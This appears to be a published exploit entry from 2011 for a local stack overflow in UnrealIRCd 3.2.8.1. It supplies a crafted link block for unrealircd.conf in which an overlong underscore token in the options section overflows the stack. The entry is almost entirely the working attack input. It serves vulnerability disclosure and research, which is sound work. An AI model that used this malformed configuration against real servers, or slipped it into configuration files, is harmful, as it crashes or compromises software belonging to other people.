# Exploit Title: UnrealIRCd local configuration stack overflow
# Date: 20/10/2011
# Author: DiGMi (http://digmi.org)
# Software Link: http://www.unrealircd.com/downloads/Unreal3.2.8.1.exe
# Version: 3.2.8.1 and probably every previous version
# Tested on: Windows 7
# Details and explanations can be found here: http://www.digmi.org/2011/10/researching-unrealircd.html
 
Add the following to the unrealircd.conf file :
 
link            DiGMi.org
{
    username    *;
    hostname    1.2.3.4;
    bind-ip     *;
    port        7029;
    hub             *;
    password-connect "LiNk";
    password-receive "LiNk";
    class           servers;
        options {
            /* Note: You should not use autoconnect when linking services */
            autoconnect;
            ________________________________________________________________________________________________________________________________________________________;
            zip;
        };
};
